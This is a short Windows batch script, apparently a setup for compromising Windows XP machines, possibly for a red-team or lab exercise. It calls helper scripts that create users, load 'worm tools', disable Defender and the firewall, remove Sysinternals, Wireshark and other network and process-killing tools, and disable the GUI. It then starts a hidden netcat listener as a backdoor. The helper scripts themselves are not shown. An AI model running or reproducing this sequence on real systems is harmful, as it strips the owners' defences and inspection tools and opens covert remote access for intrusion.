@echo off
::setup scripting for Windows Xp tools

call createUsers.bat
call wormtools.bat
call disableDefender.bat
call disablefirewall.bat
call removeKillers.bat
call removeNetworkTools.bat
call removeSYSinternals.bat
call removewireshark.bat
call renameCliNetworkTools.bat
call disableGUI.bat
start /min netcatlistener.bat